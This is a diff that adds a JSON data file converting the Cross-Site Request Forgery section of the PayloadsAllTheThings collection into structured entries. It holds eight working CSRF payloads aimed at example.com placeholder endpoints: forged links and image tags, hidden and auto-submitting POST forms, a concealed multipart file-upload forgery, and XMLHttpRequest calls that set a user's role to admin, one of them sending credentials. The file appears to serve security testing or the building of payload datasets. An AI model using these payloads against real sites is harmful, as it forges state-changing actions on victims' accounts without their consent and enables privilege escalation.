@@ -1,0 +1,112 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "crosssite_request_forgery",
+  "original_category": "Cross-Site Request Forgery",
+  "payloads": [
+    {
+      "category": "HTML GET - Requiring User Interaction",
+      "escalation": "baseline",
+      "lines": [
+        "<a href=\"http://www.example.com/api/setusername?username=CSRFd\">Click Me</a>"
+      ]
+    },
+    {
+      "category": "HTML GET - No User Interaction",
+      "escalation": "baseline",
+      "lines": [
+        "<img src=\"http://www.example.com/api/setusername?username=CSRFd\">"
+      ]
+    },
+    {
+      "category": "HTML POST - Requiring User Interaction",
+      "escalation": "baseline",
+      "lines": [
+        "<form action=\"http://www.example.com/api/setusername\" enctype=\"text/plain\" method=\"POST\">",
+        "<input name=\"username\" type=\"hidden\" value=\"CSRFd\" />",
+        "<input type=\"submit\" value=\"Submit Request\" />",
+        "</form>"
+      ]
+    },
+    {
+      "category": "HTML POST - AutoSubmit - No User Interaction",
+      "escalation": "baseline",
+      "lines": [
+        "<form id=\"autosubmit\" action=\"http://www.example.com/api/setusername\" enctype=\"text/plain\" method=\"POST\">",
+        "<input name=\"username\" type=\"hidden\" value=\"CSRFd\" />",
+        "<input type=\"submit\" value=\"Submit Request\" />",
+        "</form>",
+        "<script>",
+        "document.getElementById(\"autosubmit\").submit();",
+        "</script>"
+      ]
+    },
+    {
+      "category": "HTML POST - multipart/form-data With File Upload - Requiring User Interaction",
+      "escalation": "baseline",
+      "lines": [
+        "<script>",
+        "function launch(){",
+        "const dT = new DataTransfer();",
+        "const file = new File( [ \"CSRF-filecontent\" ], \"CSRF-filename\" );",
+        "dT.items.add( file );",
+        "document.xss[0].files = dT.files;",
+        "document.xss.submit()",
+        "}",
+        "</script>",
+        "<form style=\"display: none\" name=\"xss\" method=\"post\" action=\"<target>\" enctype=\"multipart/form-data\">",
+        "<input id=\"file\" type=\"file\" name=\"file\"/>",
+        "<input type=\"submit\" name=\"\" value=\"\" size=\"0\" />",
+        "</form>",
+        "<button value=\"button\" onclick=\"launch()\">Submit Request</button>"
+      ]
+    },
+    {
+      "category": "JSON GET - Simple Request",
+      "escalation": "baseline",
+      "lines": [
+        "<script>",
+        "var xhr = new XMLHttpRequest();",
+        "xhr.open(\"GET\", \"http://www.example.com/api/currentuser\");",
+        "xhr.send();",
+        "</script>"
+      ]
+    },
+    {
+      "category": "JSON POST - Simple Request",
+      "escalation": "baseline",
+      "lines": [
+        "<script>",
+        "var xhr = new XMLHttpRequest();",
+        "xhr.open(\"POST\", \"http://www.example.com/api/setrole\");",
+        "//application/json is not allowed in a simple request. text/plain is the default",
+        "xhr.setRequestHeader(\"Content-Type\", \"text/plain\");",
+        "//You will probably want to also try one or both of these",
+        "//xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");",
+        "//xhr.setRequestHeader(\"Content-Type\", \"multipart/form-data\");",
+        "xhr.send('{\"role\":admin}');",
+        "</script>",
+        "<form id=\"CSRF_POC\" action=\"www.example.com/api/setrole\" enctype=\"text/plain\" method=\"POST\">",
+        "// this input will send : {\"role\":admin,\"other\":\"=\"}",
+        "<input type=\"hidden\" name='{\"role\":admin, \"other\":\"'  value='\"}' />",
+        "</form>",
+        "<script>",
+        "document.getElementById(\"CSRF_POC\").submit();",
+        "</script>"
+      ]
+    },
+    {
+      "category": "JSON POST - Complex Request",
+      "escalation": "baseline",
+      "lines": [
+        "<script>",
+        "var xhr = new XMLHttpRequest();",
+        "xhr.open(\"POST\", \"http://www.example.com/api/setrole\");",
+        "xhr.withCredentials = true;",
+        "xhr.setRequestHeader(\"Content-Type\", \"application/json;charset=UTF-8\");",
+        "xhr.send('{\"role\":admin}');",
+        "</script>"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.868Z"
+}
